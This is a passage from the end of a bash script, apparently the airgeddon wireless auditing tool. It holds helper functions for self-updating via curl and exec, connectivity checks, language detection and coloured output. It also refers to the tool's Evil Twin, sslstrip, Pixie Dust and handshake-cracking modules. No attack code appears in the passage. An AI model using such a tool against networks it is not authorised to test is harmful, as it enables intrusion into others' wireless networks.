		elif ! hash lspci 2> /dev/null; then
			echo
			language_strings "${language}" 301 "yellow"
			echo
			language_strings "${language}" 115 "read"
			exit_code=1
			exit_script_option
		fi
	fi
}

#Compare if first float argument is greater than float second argument
function compare_floats_greater_than() {

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>n2) exit 0; exit 1}'
}

#Compare if first float argument is greater or equal than float second argument
function compare_floats_greater_or_equal() {

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

#Update and relaunch the script
function download_last_version() {

	curl -L ${urlscript_directlink} -s -o "${0}"

	if [ "$?" = "0" ]; then
		echo
		language_strings "${language}" 214 "yellow"

		scriptpath=${0}
		if ! [[ ${0} =~ ^/.*$ ]]; then
			if ! [[ ${0} =~ ^.*/.*$ ]]; then
				scriptpath="./${0}"
			fi
		fi

		chmod +x "${scriptpath}" > /dev/null 2>&1
		language_strings "${language}" 115 "read"
		exec "${scriptpath}"
	else
		language_strings "${language}" 5 "yellow"
	fi
}

#Validate if the selected internet interface has internet access
function validate_et_internet_interface() {

	echo
	language_strings "${language}" 287 "blue"
	check_internet_access "${host_to_check_internet}"

	if [ "$?" != "0" ]; then
		echo
		language_strings "${language}" 288 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	check_default_route "${internet_interface}"
	if [ "$?" != "0" ]; then
		echo
		language_strings "${language}" 290 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 289 "yellow"
	language_strings "${language}" 115 "read"
	internet_interface_selected=1
	return 0
}

#Check for active internet connection
function check_internet_access() {

	ping -c 1 ${host_to_check_internet} -W 1 > /dev/null 2>&1
	return $?
}

#Check for default route on an interface
function check_default_route() {

	route | grep "${1}" | grep "default" > /dev/null
	return $?
}

#Update the script if your version is lower than the cloud version
function autoupdate_check() {

	echo
	language_strings "${language}" 210 "blue"
	echo
	hasinternet_access_for_update=0

	check_internet_access "${host_to_check_internet}"
	if [ "$?" = "0" ]; then
		hasinternet_access_for_update=1
	fi

	if [ ${hasinternet_access_for_update} -eq 1 ]; then

		airgeddon_last_version=$(timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -1 | cut -d "\"" -f 2)

		if [ "${airgeddon_last_version}" != "" ]; then
			if compare_floats_greater_than "${airgeddon_last_version}" "${airgeddon_version}"; then
				language_strings "${language}" 213 "yellow"
				download_last_version
			else
				language_strings "${language}" 212 "yellow"
			fi
		else
			language_strings "${language}" 5 "yellow"
		fi
	else
		language_strings "${language}" 211 "yellow"
	fi

	language_strings "${language}" 115 "read"
}

#Check if you can launch captive portal Evil Twin attack
function check_et_without_internet_compatibility() {

	if ! hash "${optional_tools_names[12]}" 2> /dev/null; then
		return 1
	fi
	return 0
}

#Change script language automatically if OS language is supported by the script and different from current language
function autodetect_language() {

	[[ $(locale | grep LANG) =~ ^(.*)=\"?([a-zA-Z]+)_(.*)$ ]] && lang="${BASH_REMATCH[2]}"

	for lgkey in "${!lang_association[@]}"; do
		if [[ "${lang}" = "${lgkey}" ]] && [[ "${language}" != "${lang_association[${lgkey}]}" ]]; then
			autochanged_language=1
			language=${lang_association[${lgkey}]}
			break
		fi
	done
}

#Clean some known and controlled warnings for shellcheck tool
function remove_warnings() {

	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${mdk3_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip_dependencies[@]}" > /dev/null 2>&1
	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${is_arm}" > /dev/null 2>&1
}

#Print a simple separator
function print_simple_separator() {

	echo_blue "---------"
}

#Print a large separator
function print_large_separator() {

	echo_blue "-------------------------------------------------------"
}

#Add the PoT prefix on printed strings if PoT mark is found
function check_pending_of_translation() {

	if [[ "${1}" =~ ^${escaped_pending_of_translation}([[:space:]])(.*)$ ]]; then
		text="${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}"
		return 1
	elif [[ "${1}" =~ ^${escaped_hintvar}[[:space:]](\\033\[[0-9];[0-9]{1,2}m)?(${escaped_pending_of_translation})[[:space:]](.*) ]]; then
		text="${cyan_color}${pending_of_translation} ${brown_color}${hintvar} ${pink_color}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\*+)[[:space:]]${escaped_pending_of_translation}[[:space:]]([^\*]+)(\*+)$ ]]; then
		text="${2}${BASH_REMATCH[1]}${cyan_color} ${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\-+)[[:space:]]\(${escaped_pending_of_translation}[[:space:]]([^\-]+)(\-+)$ ]]; then
		text="${2}${BASH_REMATCH[1]} (${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	fi

	return 0
}

#Print under construction message used on some menu entries
function under_construction_message() {

	local var_uc="${under_constructionvar^}"
	echo
	echo_yellow "${var_uc}..."
	language_strings "${language}" 115 "read"
}

#Canalize the echo functions
function last_echo() {

	check_pending_of_translation "${1}" "${2}"
	if [ "$?" != "0" ]; then
		echo -e "${2}${text}${normal_color}"
	else
		echo -e "${2}$*${normal_color}"
	fi
}

#Print green messages
function echo_green() {

	last_echo "${1}" "${green_color}"
}

#Print blue messages
function echo_blue() {

	last_echo "${1}" "${blue_color}"
}

#Print yellow messages
function echo_yellow() {

	last_echo "${1}" "${yellow_color}"
}

#Print red messages
function echo_red() {

	last_echo "${1}" "${red_color}"
}

#Print red messages using a slimmer thickness
function echo_red_slim() {

	last_echo "${1}" "${red_color_slim}"
}

#Print pink messages
function echo_pink() {

	last_echo "${1}" "${pink_color}"
}

#Print cyan messages
function echo_cyan() {

	last_echo "${1}" "${cyan_color}"
}

#Print brown messages
function echo_brown() {

	last_echo "${1}" "${brown_color}"
}

trap capture_traps INT
trap capture_traps SIGTSTP
welcome
